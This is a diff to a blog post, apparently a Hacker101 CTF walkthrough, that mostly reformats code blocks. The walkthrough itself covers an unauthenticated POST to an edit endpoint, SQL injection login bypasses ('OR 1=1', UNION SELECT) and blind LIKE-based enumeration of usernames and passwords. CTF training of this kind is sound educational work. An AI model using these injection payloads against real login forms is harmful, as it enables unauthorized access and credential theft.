@@ -11,9 +11,7 @@ excerpt: A Hacker101 CTF walkthrough covering HTTP method manipulation, SQL inje
 
 While browsing the application as an unauthenticated user, I noticed that some pages contained an Edit link. Clicking the link redirected to the `/login` page, indicating that authentication was required through the normal interface.
 I intercepted the request using Burp Suite and inspected the edit endpoint:
-```
-/page/edit/1
-```
+`/page/edit/1`
 
 Instead of requesting the page normally, I changed the HTTP method to OPTIONS.
 The server responded with an Allow header indicating that POST was an accepted method:
@@ -27,9 +25,8 @@ Allow: POST, OPTIONS, GET, HEAD
 ```
 
 Since POST was allowed on the endpoint, I sent a POST request directly to:
-```
-/page/edit/1
-```
+`/page/edit/1`
+
 without authenticating through the normal login flow.
 The endpoint processed the request and returned the first flag.
 
@@ -38,26 +35,16 @@ The endpoint processed the request and returned the first flag.
 Next, I investigated the `/login` endpoint.
 
 Submitting a normal, nonexistent username resulted in:
-```
-Unknown User
-```
+`Unknown User`
 I then tested whether the username parameter was vulnerable to SQL injection. Supplying:
-```mysql
-admin'
-```
+`admin'`
 caused the application to return:
-```
-500 Server Error
-```
+`500 Server Error`
 This suggested that the input was being inserted directly into an SQL query without proper sanitization or parameterization.
 I then tried:
-```mysql
-admin' OR '1'='1'#
-```
+`admin' OR '1'='1'#`
 Instead of receiving Unknown User, the application responded with:
-```
-Invalid Password
-```
+`Invalid Password`
 This was significant because it indicated that the SQL query was being affected by my input.
 
 #### Understanding the login query
@@ -69,7 +56,7 @@ WHERE username = 'input'
 AND password = 'input';
 ```
 If the application directly inserts user input into this query, SQL syntax can be manipulated through the username field.
-I then used a UNION injection:
+I then used a `UNION` injection:
 ```mysql
 username=admin' UNION SELECT "1234"#
 password=1234
@@ -82,17 +69,14 @@ UNION
 SELECT "1234" #'
 AND password = '1234';
 ```
-The exact query depends on how the application constructs the SQL statement, but the important part is the UNION SELECT.
+The exact query depends on how the application constructs the SQL statement, but the important part is the `UNION SELECT`.
 
 #### Why does SELECT `1234` work?
 
 It is important to understand that:
-```mysql
-SELECT 1234;
-```
+`SELECT 1234;`
 does not mean:
 `Find 1234 in a table.`
-
 Instead, it asks the database to produce a result containing the value `1234`.
 For example, imagine the database contains:
 ```
@@ -107,9 +91,7 @@ USERS TABLE
 There is no `1234` in the table.
 
 However:
-```
-SELECT 1234;
-```
+`SELECT 1234;`
 can still return:
 ```
 ┌──────┐
@@ -184,22 +166,15 @@ After obtaining the previous flag,we need to determine the actual username rathe
 I noticed that the application produced different responses depending on whether the injected SQL condition matched a user.
 
 For example, I tested:
-```
-admin' OR username LIKE "a%"
-```
+`admin' OR username LIKE "a%"`
 The application responded with:
-```
-Unknown User
-```
+`Unknown User`
 I then tried:
-```
-admin' OR username LIKE "d%"
-```
+`admin' OR username LIKE "d%"`
 and received:
-```
-Invalid Password
-```
+`Invalid Password`
 This gives us a useful true/false SQL.
+
 We can interpret the responses as:
 ```
 Unknown User
@@ -215,9 +190,7 @@ Therefore, we can ask the database questions without directly seeing the databas
 #### Finding the username
 
 The SQL condition:
-```
-username LIKE 'd%'
-```
+`username LIKE 'd%'`
 means:
 Does a username exist that starts with d?
 The % wildcard means that any characters can follow d.
@@ -271,30 +244,20 @@ print("Username:", username)
 
 How the script works
 The script uses two nested loops, The outer loop determines how many characters we want to discover:
-```
-for position in range(10):
-```
+`for position in range(10):`
 The inner loop tries every character in our alphabet:
-```
-for letter in alphabet:
-```
+`for letter in alphabet:`
 The current guess is constructed with:
-```
-guess = username + letter
-```
+`guess = username + letter`
 
 This eventually reveals the complete username.
 
 #### Enumerating the password
 
 The same technique can be applied to other values in the database, For example, after identifying the username, the SQL condition can be changed from:
-```
-username LIKE 'prefix%'
-```
+`username LIKE 'prefix%'`
 to:
-```
-password LIKE 'prefix%'
-```
+`password LIKE 'prefix%'`
 The Python logic remains almost identical:
 ```
 Try a character
